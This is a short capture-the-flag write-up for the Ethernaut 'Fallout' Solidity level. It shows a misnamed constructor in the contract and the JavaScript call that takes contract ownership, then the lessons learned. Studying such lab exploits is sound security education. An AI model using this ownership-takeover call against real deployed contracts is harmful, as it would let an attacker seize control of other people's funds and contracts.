# Level 2: Fallout

## Challenge Overview

The `Fallout` challenge demonstrates the importance of constructor naming in Solidity.  
The goal is to claim ownership of the contract by exploiting an incorrectly named constructor.

## Goal

- **Call a misnamed constructor to become the contract owner.**

## Solution

In older Solidity versions, constructors were functions with the same name as the contract.  
The `Fallout` contract contains a misnamed constructor:

```solidity
function Fallout() public payable {
    owner = msg.sender;
}
```

## To solve this:

1. **Call the `Fallout` function**

```javascript
// Call the mis-named “constructor” as a payable tx
await contract.Fallout({
  value: toWei("0") // send 0 or you can also send a tiny amount like "0.0001"
});
```

2. **Verify ownership**

```javascript
// Confirm you have taken ownership
console.log("new owner =", await contract.owner(), "should equal player:", player);
```

---

## Lessons Learned

- **Always use the `constructor` keyword** for defining constructors in modern Solidity.
- Be cautious of naming conventions, as they can lead to critical vulnerabilities.
